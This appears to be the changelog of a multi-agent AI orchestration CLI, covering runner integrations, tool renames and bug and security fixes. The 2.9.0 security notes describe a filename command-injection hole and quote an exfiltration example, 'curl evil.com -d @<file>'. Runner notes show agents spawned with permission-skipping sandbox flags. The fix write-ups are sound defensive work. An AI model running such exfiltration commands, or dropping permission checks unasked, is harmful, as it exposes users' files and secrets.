  transitive `@ai-sdk/provider-utils` dependency.

### Added

- Native Codex `PreToolUse` and `PostToolUse` hooks are now generated by
  `monomind init`, including a project-local bridge to Monomind's shared hook
  runtime.

### Fixed

- Fresh hook processes no longer synchronously open the monograph database on
  the critical path, preventing false hook failures from the five-second hook
  timeout.
- Repository-wide Biome lint issues and invalid optional AI SDK dependency
  ranges were corrected.

## [2.9.23] — 2026-08-22

### Fixed

- `org gate-approve`/`org gate-reject` had no offline-queue fallback (unlike
  `org approve`/`org deny`/`org answer`) — a rejected or unreachable live
  daemon call hard-failed instead of resolving `gates.json` directly,
  permanently blocking the gate for any org run without a reachable
  live-delivery channel. (#213)
- `CodexAgentRunner` silently produced zero assistant text and zero token
  accounting against current codex CLI installs (v0.149.0+): the wire format
  moved from `session_configured`/`agent_message`/`token_count`/`task_complete`
  to an item-based `thread.started`/`item.completed`/`turn.completed` shape,
  and the runner recognized none of it — with `exitCode` still 0, nothing
  surfaced as an error either. Both wire formats are now parsed. (#178, #204)
- `CodexAgentRunner` buffered all of codex's stdout until the subprocess
  exited before parsing anything, so a turn longer than the 4-minute
  silent-stream watchdog yielded zero messages in time — abort, retry, kill,
  circuit breaker. Same bug class as the kimi/antigravity runners; rewritten
  to stream incrementally with a spawn-time liveness message. (#204)
- A bad merge left `packages/@monomind/cli` failing to compile (`tsc`
  errors from a stray `antigravity` field on the wrong config object, and a
  missing required field on another) — the real build (not just
  `--noEmit`) was broken on `main`. Fixed before this release.

### Changed — `swarm` + `hive-mind` renamed to `monoswarm` (clean break, no aliases)

The old names borrowed distributed-systems terms of art (`raft`, `byzantine`/`bft`,
`quorum`, `consensus`, `broadcast`) for what is actually in-process JSON-file
bookkeeping and single-process vote counting. That mismatch had accumulated ~40
separate disclaimer passages across docs, agent/skill/command files, and tool
descriptions, each re-explaining "this is not real Raft / not distributed."
Renamed everything to a vocabulary that means what the code does, so the honesty
notes shrink to one short clause per tool instead of a defensive paragraph
everywhere. `hive-mind` no longer exists as a separate concept — it is folded
into `monoswarm`. **This is a breaking change with no backward-compat shim.**

- CLI: `monomind swarm <sub>` → `monomind monoswarm <sub>` (same 5 subcommands:
  init/start/status/stop/scale).
- MCP tools: the 16 `swarm_*`/`hive-mind_*` tools become 13 `monoswarm_*` tools
  (`monoswarm_init/status/scale/health/shutdown/agent_add/join/leave/vote/notice/memory/audit_list/audit_verify`).
  `hive-mind_spawn` → `monoswarm_agent_add`, `hive-mind_broadcast` → `monoswarm_notice`
  (both renamed specifically because "spawn" and "broadcast" were the two names
  needing the heaviest disclaimers, and neither claim is true of the code).
- Vote strategies: `raft` → `majority`, `bft`/`byzantine` → `supermajority`,
  `quorum` → `unanimous` (preset) or `threshold` (custom `minVotes`). `gossip`
  and `crdt` — declared but never implemented — are deleted entirely rather than
  kept as rejected options.
- State: the two old files (`.monomind/swarm/swarm-state.json`,
  `.monomind/hive-mind/state.json`) are merged into a single
  `.monomind/monoswarm/state.json`. Old files are **not migrated** — they are
  abandoned in place; `monomind cleanup` now knows the legacy paths so they can
  be purged.
- Config: `monomind.config.json`'s `swarm` key → `monoswarm`; `SwarmConfig` type
  → `MonoswarmConfig`.
- `.claude/`: `agents/{swarm,hive-mind}/` merged into `agents/monoswarm/` (and 7
  renamed agent slugs, e.g. `swarm-pr` → `monoswarm-pr`); the three skills
  `swarm-orchestration`/`swarm-advanced`/`hive-mind-advanced` merged into one
  `monoswarm` skill; `commands/{swarm,hive-mind}/` merged into `commands/monoswarm/`.
- Docs: `doc/concepts/swarm.md` → `doc/concepts/monoswarm.md`, rewritten as one
  positive "how it works" explanation instead of five separate disclaimer
  passages; the scattered disclaimers in root/package `CLAUDE.md`, agent
  definitions, and generated CAPABILITIES.md were trimmed to match.
- Two pre-existing bugs fixed in passing: `claudemd-generator.ts` was emitting
  `Use raft consensus for hive-mind` into every generated project `CLAUDE.md` —
  the one place still asserting what every other doc disclaimed; and
  `guidance-tools.ts` listed 10 tool/command names that had never existed
  (`swarm_spawn`, `hive_mind_vote`, …).

**Upgrading:** update any script or CI step invoking `monomind swarm ...` to
`monomind monoswarm ...`, and any MCP client calling `swarm_*`/`hive-mind_*`
tools directly to the `monoswarm_*` equivalents above. Purge stale local state
with `monomind cleanup`.

## [2.9.22] — 2026-08-17

### Added (PR #167)
- **5 new subprocess-CLI org runtimes** — `grok`, `qwen`, `crush`, `copilot`, `pi`, each wrapping the corresponding vendor CLI the same way `codex`/`kimicode` already do (spawn, parse output, normalize into the shared `AgentRunner` stream). Wire protocols (flags, JSON event shapes) are sourced from public docs, not verified against a live install — see #178 for follow-up.
- **`pi-rpc` runtime** (opt-in alternate to `pi`) — keeps the `pi --mode rpc` subprocess alive for a whole mailbox session instead of respawning per turn, using a literal JSON schema pulled from pi-mono's own `rpc.md` source. Turn-completion detection is an explicitly-flagged best-effort heuristic — see #179.
- **`usage-proxy.ts`** — a generic loopback HTTP proxy that extracts token usage from OpenAI/Anthropic-shaped LLM traffic for CLIs (`crush`) that don't self-report it. Built and tested, but not yet wired into org/role config — see #177.
- **`org watch <org> <role> [--verbose] [--stats]`** — a thin, role-filtered live-tail of a role's assistant chat text, off the same bus event every runtime already emits. `--verbose` interleaves status/restart events; `--stats` shows a running token/cost ticker.
- Startup-hang fail-fast timer (45s, distinct from the 2h turn timeout) in all 5 new runners, plus confirmed trust-gate/telemetry env-var suppressions (`PI_TELEMETRY`, `PI_SKIP_VERSION_CHECK`, `CRUSH_DISABLE_PROVIDER_AUTO_UPDATE`).

### Fixed (found across 4 rounds of adversarial review of the above, same PR)
- pi-rpc: original spawn error was discarded before the ENOENT check could match it, hiding the "install pi" message behind a generic error.
- pi-rpc: the mid-session silence watchdog could kill a healthy role that was simply idle (waiting on its own mailbox) or blocked on `ask_human` — both are now correctly excluded from counting as "pi is wedged".
- pi-rpc: a SIGKILL escalation could be cancelled mid-grace-period by its own cleanup path, risking an orphaned process.
- `crush`/`grok`/`qwen`/`copilot`/`pi` runners: timer cleanup could be skipped entirely on a stdout stream error, leaking the turn timeout and orphaning the child process (now also killed on that path).
- `crush`: usage-proxy totals were reset every tool-call round instead of once per turn, discarding all but the last round's usage.
- `grok`/`qwen`: tool-result rounds after the first could silently lose all conversational context if session-id parsing ever failed.
- `usage-proxy`: Accept-Encoding wasn't stripped (a gzipped upstream response silently parsed to garbage → 0 usage forever); Anthropic's `input_tokens` (nested under `message.usage` on `message_start`) was never checked, and "last chunk wins" logic could erase an earlier chunk's field when a later chunk didn't repeat it.

### Known follow-ups
See #177 (wire up usage-proxy), #178 (install & validate all 6 CLI-backed runtimes incl. `codex`), #179 (verify pi-rpc's completion heuristic), #180 (confirm `crush --continue` session scoping), #181 (copilot has no usage accounting), #182 (session-lifetime `qwen-rpc`, blocked on confirming qwen's bidirectional wire format).

## [2.9.21] — 2026-08-16

### GitHub issue fixes
- **#156 — `control-start.cjs` adopt-loop silently adopted an auth-mismatched server after #150's own fix.** `probeStatus()` returns the string `'unauthorized'` (not `null`) for a server that answers but rejects the dashboard token — a non-empty string is truthy in JS, so the adopt loop treated a 401-rejecting server exactly like a healthy one, writing `pid:0` and leaving the mismatch in place instead of skipping past it to scan for an actually-adoptable server.
- **#158 — idle-nudge and `org_complete` guidance let the boss end a multi-phase goal after just one batch.** The idle-watchdog nudge offered only a binary choice ("call `org_complete`" or "reassign stalled work"), with no option for "nothing's stalled, but the goal has more scope left — dispatch the next batch instead." Combined with ambiguous "goal is achieved" wording that never distinguished "this batch" from "the org's full stated goal," the boss had no textual signal steering it away from over-eagerly ending a run with real scope remaining. Reworded the kickoff briefing, the idle-nudge (now a real three-way choice), and the `org_complete` tool description to make that distinction explicit.
- **#160 — `org approve`/`deny`/`answer`/`gate-approve` never sent the daemon auth credential on the live-delivery path.** `/api/answer-question`, `/api/set-approval`, and `/api/resolve-gate` all require an `x-monomind-cred` header; the client attached it correctly for `/api/xdeliver` but not these three, so every live delivery 401'd and silently fell back to the slower offline file-write path (only a warning printed — easy to miss).
- **#163 — `countSdkProcesses`/`reapOrphanedSdkProcesses` spammed console errors on Windows.** Both unconditionally shelled out to `pgrep`/`ps`, which don't exist on native Windows; the failure was caught, but `execSync` inherits stderr by default, so every lazy role spawn printed `'pgrep' is not recognized...` to the console. Now skips the shell-out entirely on `win32` (returns 0 / unknown) and silences inherited stderr on the platforms where the commands do exist.

### Added
- **`policy.autoApproveTools`** — a role's policy can now name specific sensitive actions (`Bash`, `WebFetch`, `WebSearch`, `org_complete`, …) it's pre-trusted for, bypassing the human-approval pause for just those actions on that role. Still subject to `allowTools`/`denyTools` and the policy engine's own decision — this only skips the "pause and wait for a human" step for actions the operator has explicitly opted the role into.

## [2.9.20] — 2026-08-15

### GitHub issue fixes (#155 follow-up)
- **Dashboard's `activeOrgs` gap-fill still couldn't detect a completed run after the first #155 fix** — the corrected event-string matching was right, but `run_events` (SQLite) is only populated by *live* event forwarding while a dashboard is connected, not backfilled from a run's actual history. A dashboard started after a run had already stopped never saw most (or any) of that run's events — including its terminal one — so the query had nothing to match. Replaced the whole event-scanning approach with a direct read of `runtime.json`'s own authoritative `status` field (the exact thing `monomind org status` reads), also treating a `"running"` record with a dead pid as not-active. Verified end-to-end against a real running server instance, not just unit tests.

## [2.9.19] — 2026-08-15

### Refactor (#122, PR #154)
- Pruned unwired memory consolidation subsystems (`ControllerRegistry`, `database-provider.ts`, `UnifiedMemoryService`, `TieredCacheManager`) that were maintained against mocks and never invoked by the live CLI or MCP runtime — net -3,244 lines. Fixed a build-breaking re-export of already-deleted functions introduced during the PR's own merge before shipping it.

### GitHub issue fixes (#155)
- **Dashboard's `activeOrgs` gap-fill never detected a completed run.** The SQLite path checked `type IN ('run:complete','org:complete','org:stop')` — daemon.ts never emits any of these; the real terminal signal is a `type:'status'` event with `msg:'org stopped'` or `reason:'org-complete'`, carried in the JSON-stringified `raw` column, not a dedicated type string. Every org's latest run was always reported active regardless of whether it had actually finished. The JSONL fallback (used when sql.js is unavailable) had the same stale `<org>/runs/` path bug already fixed in #138 for `statusline.cjs` — Org Runtime v2 writes `<org>/<runId>/bus.jsonl`, not a `runs/` directory. Both paths now match the real terminal signals/paths.

## [2.9.18] — 2026-08-15

### GitHub issue fixes (#149)

- **`org run --resume` no longer dies silently on a stale SDK session.** The reported symptom (org idle 10m, boss "unreachable", zero messages/tokens exchanged) traced to `resumeSessionId` being seeded from the checkpoint's persisted SDK session_id — which can legitimately no longer exist on the provider's side by resume time (the repro resumed ~8h after `org stop`). Any error on that first resumed call besides the turn-limit pattern was rethrown straight into the crash/backoff path: 3 attempts over ~21s, then a terminal crash that closes the mailbox — matching "Messages: 0" and "boss unreachable" exactly. Mirrors the existing turn-limit-recovery pattern: the first failure on a checkpoint-provided session id now drops it and retries once with a fresh session instead of crashing, bounded so a second, real failure still crashes normally.
- Note: the issue's own proposed root cause (mailboxes staying closed after `org stop`) was verified **not** to hold on current code — `finishStop()` snapshots the checkpoint before closing mailboxes specifically so this doesn't happen. A fix built on that diagnosis was drafted and discarded after it regressed the existing "no zombie agents on resume" invariant for genuinely crashed roles.

## [2.9.17] — 2026-08-15

### GitHub issue fixes (#152)

- **The org-stop drain-timeout audit event no longer hides which roles were cut off mid-work.** On a real 22-role org run, `org_complete` was called while six workers were still actively writing files; the 5-minute drain window let most finish, but at least one was still mid-write when it expired and got force-stopped — the resulting audit event said only "proceeding anyway," with no way to tell real in-progress work being cut off from idle-but-not-yet-reaped sessions. `finishStop()` now collects every role still `'running'` (mid-turn) at the moment the drain window expires, includes that roster in both the audit message and structured `data.stillActive`, and omits the "still active" suffix entirely when nothing was actually cut off.
- `org_complete`'s tool description now tells the boss to check `org_tasks` and avoid calling it while siblings have in-progress work, reaching the model at the exact moment it decides to call it.

## [2.9.16] — 2026-08-15

### GitHub issue fixes (#150)

- **`control-start.cjs` no longer trusts a live-but-auth-mismatched dashboard.** `probeStatus()` used to collapse "no server there" and "a server answered but rejected our dashboard-token" (401) into the same `null` result, so a live server left over from a prior port collision — up, but pairing-mismatched — was indistinguishable from a healthy one. It now returns a distinct `'unauthorized'` sentinel, and the "already running" check treats that as stale and restarts, same as a project or build mismatch.
- **`monomind org run` now actively verifies/heals the dashboard on every run**, instead of only trusting whatever `control.json` already had. It (re)invokes the project's own `.claude/helpers/control-start.cjs` if `monomind init` has set one up, so a stale/dead/mismatched dashboard self-heals per run, not only once at Claude Code `SessionStart`.

### Fix
- Synced a leftover cross-copy drift in `statusline.cjs` (root `.claude/`/`.gemini/` were missing the `getVersion` testability export that `packages/@monomind/cli/.claude/` already had, from #146/PR #147) — caught by this repo's own tree-parity check.

## [2.9.15] — 2026-08-15

### Critical fix — broken 2.9.14 publish (#148)

- **`monomind@2.9.14`/`@monoes/monomindcli@2.9.14` were published with 5 unresolved `workspace:*` dependencies and were uninstallable** (`npm error code EUNSUPPORTEDPROTOCOL`) — this release supersedes them via a correct `pnpm publish`, verified against the registry after publishing (all 5 previously-`workspace:*` deps resolve to real version numbers). `2.9.14` is deprecated on npm pointing here.
- **Closed a blind spot in the #130 publish guard** (`check-workspace-deps.mjs`) that let this through undetected: it only scanned `dependencies`/`devDependencies`/`peerDependencies`, missing 4 of the 5 affected deps (`@monoes/hooks`, `@monoes/mcp`, `@monoes/memory`, `@monoes/routing`), which live under `optionalDependencies`. It now scans that too.
- The actual #146 fix (statusline `getVersion()` on Windows) is included here as well — it shipped correctly in the 2.9.14 *source*, just not the broken publish.

## [2.9.14] — 2026-08-15

### GitHub issue fixes (#146)

- **#146 — `statusline.cjs` `getVersion()` always showed the `v1.0.6` placeholder on Windows.** The npm-global-prefix fallback only checked the Unix layout (`<prefix>/lib/node_modules/monomind/package.json`), but npm on Windows puts global packages directly under `<prefix>/node_modules/` — so the fallback silently failed on every Windows install and the hardcoded placeholder won. Now both layouts are checked in turn (Windows first, then macOS/Linux), and only when both miss does the placeholder remain.

## [2.9.13] — 2026-08-15

### GitHub issue fixes (#144)

- **#144 — `confirmPort()` decoupled from the SessionStart hook's 5s timeout.** #142/#143's liveness-based wait can legitimately take up to ~5 minutes (cold npx resolve, AV/filesystem contention right after an install), but it ran inline inside the same process the hook kills at 5s — so in real usage it almost always got truncated before confirmation ever completed, defeating those fixes and leaving `control.json` stuck on its pre-confirmation optimistic guess. `main()` now spawns the dashboard, writes the optimistic status, hands confirmation off to a second fully independent detached process, and exits immediately — matching this file's own module docstring, which wasn't actually true before this change. The new `runConfirm()` process is free to take as long as it legitimately needs without the hook's timeout ever touching it.

## [2.9.12] — 2026-08-14

### GitHub issue fixes (#142 follow-up)

- **#142 follow-up — `confirmPort()` now waits on liveness, not a fixed budget.** #142's 30s npx-fallback budget helps the common case, but a follow-up report found it's still occasionally too tight right after a fresh global reinstall — one run measured the server taking ~142s to report (vs. the normal ~5-9s), likely npm/AV-scan contention on a freshly-written `node_modules` tree, not registry resolve time. `CONFIRM_ATTEMPTS` is now a minimum grace period, not the hard budget: past it, `confirmPort()` only gives up once the child has actually exited — a live child that simply hasn't reported yet keeps getting the benefit of the doubt, up to a 5-minute absolute safety-net ceiling.

## [2.9.11] — 2026-08-14

### GitHub issue fixes (#143)

- **#143 — `confirmPort()`'s identity check couldn't survive #141's `shell: true` fix.** Under `shell: true`, `child.pid` is the wrapping `cmd.exe`'s pid, not the real dashboard server's — so the `rep.pid === child.pid` comparison against the server-reported pid (`BOUND_REPORT`) could never match on the npx-fallback path, no matter the timeout (#142's fix didn't help). The npx-fallback path always fell through to "server did not respond" and killed a server that was, in practice, already up. Identity was never really about the pid match: `BOUND_REPORT`'s path is already unique per invocation, so its mere presence with a valid port is sufficient proof of ownership. Dropped the pid comparison and switched `control.json` to record the real, server-reported pid (`rep.pid`) instead of `child.pid`.

## [2.9.10] — 2026-08-14

### GitHub issue fixes (#141 follow-up, #142)

- **#141 follow-up — `control-start.cjs` is now synced by `monomind init upgrade`.** It was never in the `HELPER_FILES` force-sync registry, so existing projects never picked up the #141 EINVAL fix automatically; users had to manually copy the file out of `node_modules`. Registered alongside `statusline.cjs`/`graphify-freshen.cjs` (force-synced, doctor-tracked, no fallback generator).
- **#142 — `confirmPort()`'s 10s window is now 30s for the `npx` fallback path.** Every other `findCliPath()` branch spawns `node` directly against an already-resolved path and pays no resolve cost, but the last-resort `npx monomind@latest ui` fallback pays npx's own first-time package resolve into its `_npx` cache — measured at ~12.4s cold vs ~3.4s warm. On a fresh install this killed the dashboard child as a false "orphan" before it could ever bind, exactly on the first-session case auto-start exists for.

## [2.9.9] — 2026-08-14

### GitHub issue fixes (#141)

- **#141 — `control-start.cjs` no longer silently fails to auto-start the dashboard on Windows.** The `npx.cmd` last-resort fallback was spawned without `shell: true`, which Windows requires to exec a `.cmd`/`.bat` file; the call threw `EINVAL` synchronously and the wrapper's `main().catch(() => process.exit(0))` swallowed it with zero diagnostics. `spawn()` now sets `shell: true` when the resolved command ends in `.cmd`/`.bat` on `win32`, and the outer catch logs the failure (unless `MONOMIND_HOOK_QUIET`) and releases the spawn lock instead of exiting silently.

## [2.9.8] — 2026-08-14

> Rollup release cut from `main`. The 2.9.5–2.9.7 patch releases were cut from
> a `release/v2.9.5` branch and never ported their changelog back; 2.9.8
> reconciles both lines — everything below is in the 2.9.8 tarball.

### GitHub issue fixes (#133, #136–#140)

- **#140 — a role hitting `max_turns_per_message` no longer crashes the org.** A turn-limit error (thrown or `error_max_turns` result) now grants a bounded continuation turn with a fresh session instead of permanently dropping the role mid-task. **`monomind org run <name> --resume`** reconstructs role state from the persisted checkpoint (mailbox queues, policy usage, metrics, scrollback, SDK session ids) via `startOrg({resume})` — the checkpoint was previously write-only. `checkpoint.status` now tracks the runtime status it was captured under instead of always claiming `running`.
- **Default `max_turns_per_message` is now 100,000** (`DEFAULT_MAX_TURNS_PER_MESSAGE`) — effectively unlimited so the ceiling can never brick a legitimately long task. Real guardrails remain `budget_tokens`, the idle watchdog, and the circuit breaker. `org create` mentions it budget-style; explicit per-org/per-role values are preserved. The `org run` cost estimate caps its planning math at 30 turns/message so the unlimited default doesn't balloon it.
- **#139 — new `monomind ui` command** (alias `dashboard`) starts the Neural Control Room from the published CLI — `control-start.cjs`'s `npx monomind@latest ui` fallback path works now (`--port`, `--no-open`, `--project-dir`).
- **#137 — Windows SessionStart crash fixed.** The npx fallback resolves `npx.cmd` on win32 and the spawned child carries an `error` listener that releases the spawn lock instead of crashing the hook.
- **#138 — statusline `getActiveOrgs()` reads Org Runtime v2 `runtime.json`** (status + pid liveness) instead of a `runs/` directory the daemon never writes — the active-org row appears while an org is running. Also exposed in `--json` output.
- **#136 — dashboard visibility self-heals.** `control-start.cjs` treats an auth-walled 401 from `/api/status` as a foreign server (the adoption path was dead code under real auth). The org-run event forwarder warns once — unconditionally — when no live dashboard exists, treats a dead recorded pid as no-dashboard, and spawns the dashboard server itself (single-flight, same bound-report contract as control-start) so `org run` events no longer silently go nowhere.
- **#133 — route-outcome correlation wired.** `hooks route` records a `routeId` recommendation to `route-outcomes.jsonl`; session-end joins by `routeId` and backfills the measured outcome — the caller wiring `doctor`'s primary routing-learning path was waiting on.

### Runner fixes

- Vercel AI SDK v7 stream/usage field names corrected in `vercel-runner.ts` (usage deltas arrive on the final chunk; per-chunk field access produced NaN token counts).
- Kimi model namespace (`kimi-code/k3`) and Antigravity event parsing (`init` → `step_update` → `result`) corrections.
- `org run`'s cost estimate resolves each role's actual model (`resolveModel`) for labels instead of a hardcoded default.

### Library bumps (carrying main-only work to npm)

- `@monoes/hooks` 1.0.5 — Reflexion background worker (`worker-reflexion.ts`).
- `@monoes/mcp` 1.0.3 — MCP registry population (`registry-metadata.json`, `/registry` server routes).
- `@monoes/memory` 1.0.15, `@monoes/routing` 1.0.4 — version sync with npm content (no code change); keeps workspace pins monotone.
- `@monoes/monograph` stays 1.5.8.

### Graph engineering playbook — dynamic work graphs + structured handoffs

Adaptation of the July 2026 "Graph Engineering for Multi-Agentic Systems"
playbook (Ng). The org runtime's TaskDag graduates from a static dependency
tracker to a dynamic work graph. Source of truth: `docs/graph-engineering-playbook.md`.

#### Dynamic TaskDag operations (`task-dag.ts`)

- **`split(parentId, children)`** — scope expansion (playbook §2.2).
- **`merge(sourceId, targetId)`** — early convergence (playbook §2.2).
- **`cancel(taskId, reason?)`** — evidence made it moot (playbook §2.2).
- New statuses: `split`, `merged`, `cancelled`. New fields: `splitFrom`, `mergedInto`.

#### New agent tools (`session.ts`)

- **`org_task_split`**, **`org_task_merge`**, **`org_task_cancel`** — wrap the new DAG ops.
- **`org_plan_graph`** — work graph generator (playbook §2.4).

#### Structured Handoff Protocol (`types.ts`)

- **`OrgHandoffSchema`** — typed envelope for inter-role context packages (playbook §2.3).

#### Per-node failure routing (`types.ts`)

- **`FailureRoutingSchema`** — retry / fallback / escalate rules (playbook §2.6).

#### Graph observability (`types.ts`)

- **`trace` BusEvent type** — per-node execution traces (playbook §2.5).

#### Org templates (`templates.ts`)

- **`kg-extraction`** — 4-role multi-agent knowledge-graph extraction pipeline.
- **`advisor-orchestrator`** — cost-efficient planner + workers pattern (playbook §2.7).

#### Tests

- 61 new tests in `tests/orgrt/` (task-dag, graph-engineering-types, dag-ops, templates, session-tools).

### Universal provider support — Vercel AI SDK + Codex CLI runners

Two new `AgentRunner` implementations extend the org runtime beyond the
Claude/Kimi/Opencode trio. Combined with the existing runners, every major
subscription and API key auth path now has a first-class home.

#### `VercelAgentRunner` — any API-key provider via the Vercel AI SDK

- **Activation:** `runtime: 'vercel'` (per-role or org-level) or auto-resolved from `provider.kind: 'vercel-api-key'`
- **Vendor registry:** 15 providers — OpenAI, Anthropic, Google, xAI, DeepSeek, **GLM** (z.ai), Mistral, Groq, Together, Fireworks, Cohere, Perplexity, Alibaba, OpenRouter, Ollama — plus a generic `openai-compatible` escape hatch
- **Primitive:** `streamText + stopWhen: isStepCount(N)` (Vercel v7)
- **Tool delivery:** Native Vercel `tool()` calling with `canUseTool` policy gating (no fence protocol needed)
- **Session resume:** `VercelSessionStore` persists message history to disk (Vercel SDK is stateless)
- **Cost tracking:** Token-only (`cost_usd: 0` — Vercel returns no USD; token budgets still enforce via policy.ts)
- **Files:** `orgrt/vercel-runner.ts`, `orgrt/vercel-providers.ts`, `orgrt/vercel-session-store.ts`
- **Optional deps:** `ai`, `@ai-sdk/openai`, `@ai-sdk/anthropic`, `@ai-sdk/google`, `@ai-sdk/xai`, `@ai-sdk/deepseek`, `@ai-sdk/mistral`, `@ai-sdk/groq`, `@ai-sdk/togetherai`, `@ai-sdk/fireworks`, `@ai-sdk/cohere`, `@ai-sdk/perplexity`, `@ai-sdk/alibaba`, `@openrouter/ai-sdk-provider`, `ollama-ai-provider`

#### `CodexAgentRunner` — ChatGPT subscription via Codex CLI subprocess

- **Activation:** `runtime: 'codex'` or auto-resolved from `provider.kind: 'codex'`
- **Auth:** Inherits `~/.codex/auth.json` from `codex login` (ChatGPT Plus/Pro/Team/Enterprise). No API key needed.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner`) — spawns `codex exec --experimental-json --sandbox danger-full-access`, parses JSONL events
- **Tool delivery:** Fence protocol (same as kimi/opencode) — `executeToolCall` now accepts `canUseTool` for policy gating
- **Protocol:** Byte-accurate against `openai/codex/sdk/typescript/src` — `thread.started` captures `thread_id`, `item.completed` with `type: 'agent_message'` yields assistant text, `turn.completed` carries usage
- **Resume:** `codex exec resume <thread_id>` (positional, not a flag)
- **Files:** `orgrt/codex-runner.ts`, `orgrt/tool-fence.ts` (executeToolCall signature extended)

#### `AntigravityAgentRunner` — Google AI Pro/Ultra via Antigravity CLI

- **Activation:** `runtime: 'antigravity'` or auto-resolved from `provider.kind: 'antigravity'`
- **Auth:** OS keyring credentials from running `agy` interactively once (Google OAuth). Google AI Pro/Ultra consumer subscription flows through this — Gemini CLI's consumer OAuth was sunset June 18, 2026; Antigravity is the official replacement.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner` / `CodexAgentRunner`) — spawns `agy -p "<prompt>" --output-format stream-json --dangerously-skip-permissions`, parses NDJSON events
- **Protocol:** Event types `init` → `step_update` (multiple) → `result`. Session ID captured from `conversation_id`. Per-token streaming accumulated and emitted as one assistant message per turn (fence stripping needs full text; matches kimi/codex behavior).
- **Resume:** `--conversation <conversation_id>`
- **Tool delivery:** Fence protocol (same as kimi/codex/opencode)
- **Install:** Go binary via `curl -fsSL https://antigravity.google/cli/install.sh | bash` (no npm package)
- **Files:** `orgrt/antigravity-runner.ts`

#### Schema + provider resolution

- `ProviderSchema.kind` extended: `'vercel-api-key'`, `'codex'` (existing kinds unchanged — backward compatible)
- `ProviderSchema.vendor` field added (15 values + `openai-compatible`)
- `runtime` enum extended in `RoleSchema` + `OrgDefSchema`: `'vercel'`, `'codex'`
- `resolveRunner()` + `resolveRoleRunner()` in `daemon.ts` now auto-resolve runtime from provider kind when no explicit `runtime` field is set
- `resolveModel()` in `session.ts` returns per-vendor default models (e.g. GLM → `glm-5.2`, Codex → `gpt-5.6-terra`, DeepSeek → `deepseek-chat`); explicit `adapter_config.model` always wins

#### SDK upgrades

- `@anthropic-ai/claude-agent-sdk` 0.3.207 → 0.3.226 — unlocks Opus 5 (`model: 'opus'` or `'claude-opus-5'`), includes MCP-connection bug fixes, better error surfacing. No breaking changes.
- **Subagent depth change:** Claude SDK 0.3.217 lowered default subagent spawn depth from 5 to 1. Swarm code relying on deep nesting must set `CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH=5`.
- **Kimi stderr fix:** `kimicode-runner.ts` now defensively extracts `session_id` from stderr as well as stdout (kimi 0.33+ may emit `session.resume_hint` on stderr in stream-json mode).

## [2.9.3] — 2026-08-11

### Publish, CLI startup, and doctor fixes (#119, #130, #131, #132)

- **#130 (critical) — `2.9.2` was uninstallable.** `packages/@monomind/cli/scripts/publish.sh` published with plain `npm publish`, which copies pnpm's `workspace:*` protocol verbatim into the tarball — `@monoes/monograph` resolved to the literal string `"workspace:*"`, which no consumer can install. Switched to `pnpm publish` (which resolves the pin correctly, same as the root package already does) and added `scripts/check-workspace-deps.mjs`, wired into the CLI package's `prepublishOnly`, to hard-block any future non-pnpm publish of a workspace-linked package.
- **#119 — lazy CLI command loading.** Every invocation (including `--version`) used to eagerly import all 32 command modules and their transitive dependencies (including the Claude Agent SDK via `org.ts`). `commands/index.ts` now lazy-loads each command on demand; `--version` imports none of them. A two-phase parse in `index.ts` resolves and registers only the invoked command's full subtree before parsing, preserving correct flag/alias scoping at any subcommand depth.
- **#131 — `doctor`'s npm check swallowed real errors.** `checkNpmVersion` mapped every failure (timeout, spawn error, genuine absence) to a fixed "npm not found" message even when npm was actually installed and working. It now distinguishes timeout vs `ENOENT` vs other errors and includes the underlying error detail.
- **#132 — `init` ran an undisclosed global install with no opt-out.** `monomind init` unconditionally ran `doctor --install` (which may `npm install -g @anthropic-ai/claude-code`) with no way to skip it and no notice before the network call. Added `monomind init --no-install`, and a one-line disclosure printed before the install actually runs.

## [2.9.2] — 2026-08-09

### PDF engine swap + post-init document ingestion

- **Replace pdf-parse with @firecrawl/pdf-inspector** — native Rust PDF extraction via napi-rs. Produces markdown output with headings, tables, and multi-column detection instead of plain text. ~47KB + platform binary vs 21MB for pdf-parse. Affects both Second Brain ingestion (`cap-documents.ts`) and knowledge graph indexing (`monograph/pdf-parse.ts`).
- **Post-init document ingestion prompt** — both `monomind init` and `monomind init --wizard` now ask whether to ingest documents into the knowledge graph (Second Brain) immediately after initialization.

## [2.9.1] — 2026-08-09

Release chore only — no user-facing changes.

## [2.9.0] — 2026-08-06

### Comprehensive review-fix release

Driven by a 7-agent review swarm that audited `packages/@monomind/cli/src/` (233 files, ~92k LOC) across seven dimensions. **28 issues fixed with regression tests (each test failed before, passes after)**; 11 deferred items tracked as GitHub issues [#62–#73](https://github.com/monoes/monomind/issues?q=label:review-swarm).

**Test results:** 820 passed / 13 failed → **884 passed / 0 failed** (+64 passing, −13 failures).

#### 🔒 Security (privacy-claim violations closed)

- **Command injection in document extraction (C1)** — `packages/@monomind/cli/src/capabilities/cap-documents.ts:39,52,60,247`. `execSync(\`unzip -p ${JSON.stringify(filePath)} …\`)` was exploitable via crafted `.docx`/`.pptx`/`.odt` filenames containing `$(…)` or backticks (JSON.stringify doesn't escape shell expansions inside double quotes). Fixed with `execFileSync('unzip', ['-p', filePath, …])` (no shell). 6/6 PoC tests cover the regression.
- **`terminal_execute` opt-in gate (C2)** — `packages/@monomind/cli/src/mcp-tools/terminal-tools.ts`. The metacharacter denylist cannot stop direct-binary exfiltration (`curl evil.com -d @<file>` has no metacharacters). `terminal_execute` now refuses to run unless `MONOMIND_ENABLE_TERMINAL=1` env var OR `.monomind/enable-terminal.json` opts in. Discovery tools keep working without opt-in.
- **Dashboard server binds to `127.0.0.1` (C3, Q6)** — `src/browser/dashboard/server.ts:160` and `src/orgrt/server.ts:131`. Both were binding to `::` / `0.0.0.0` (no host arg), exposing the unauthenticated dashboard + org daemon to anyone on the same LAN/VPN/Wi-Fi. Override available via `MONOMIND_BROWSE_DASHBOARD_HOST` / `MONOMIND_ORG_SERVER_HOST` env vars for container/SSH-tunnel users.
- **Crash-reporter redaction hardened (C6)** — `src/services/crash-reporter.ts:111-146`. Default-on crash reporting files public GitHub issues with the full `err.stack`; the old `redact()` only caught `/home/<user>` and 12 secret regexes, leaking project-relative paths (repo name + file structure + line numbers), non-`/Users` paths, IPv4/IPv6, internal hostnames, emails, SSNs, phones. The README's "secret/PII-scrubbed" claim is now actually true.
- **`fast-uri` CVE bump (Q1)** — `package.json` override `>=4.1.1` → `>=4.1.2` (GHSA-7p8r-x3mc-p8w7, high).

#### 🧱 Robustness

